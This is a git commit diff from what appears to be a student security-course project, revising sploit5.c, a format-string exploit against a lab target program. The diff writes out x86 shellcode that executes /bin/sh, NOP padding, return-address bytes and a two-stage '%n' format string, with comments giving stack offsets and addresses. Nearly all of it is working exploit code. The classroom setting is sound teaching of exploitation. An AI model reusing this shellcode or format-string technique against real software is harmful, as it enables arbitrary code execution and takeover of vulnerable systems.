83e561a66419ea05d29de311c69469650e4d2a41
Tanner <tannerjharper@gmail.com>
2016-04-02 21:36:09 -0500

    FINISHED!!

--- proj2-files/sploits/sploit5.c
+++ proj2-files/sploits/sploit5.c
@@ -10,11 +10,14 @@ int main(void)
 {
   char *args[3];
   char *env[1];
-  char buf[60] = "\x3d\xfe\xff\xbf" //4 bytes used, 56 left
+  char buf[] = "\x2c\xfe\xff\xbf\x90\x90\x90\x90" //first half of the addr, padded with NOPs
+  "\x2d\xfe\xff\xbf" 		  //second half of the addr  
   "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
   "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
-  "\x80\xe8\xdc\xff\xff\xff/bin/sh" //45 bytes used by shell code + 4 bytes for addr to write into, 49 bytes total; 11 bytes left
-  "%1234x%5$n"; //the format portion of the code -- MUST be last, otherwise it'll overwrite shell code in buffer		
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh"
+  "%191u%5$n%12582661u%7$n"; //the format portion of the code -- MUST be last, otherwise it'll overwrite shell code in buffer
+    //first %n writes to the last byte of addr. second %n writes to first three bytes of addr (was having problems writing entire addr in one go)
+
   args[0] = TARGET; args[1] = buf; args[2] = NULL;
   env[0] = NULL;
 
@@ -23,8 +26,6 @@ int main(void)
 
   return 0;
 }
-//"offset" for stack args seems to be 5. That is, 4 "%x" until we access the pointer that we need to write into
-//shell currently starts at 0xbffffe00
-// fdfc = 65020
-//%ebp is at 0xbffffe38 ---> so use 0xbffffe3d for addr to write into
-// 1bfff = 49667
+//"offset" for stack args seems to be 5. That is, the pointer  we need to write into is at 5$, second pointer is at 7$
+//shell currently starts at 0xbffffdf8
+
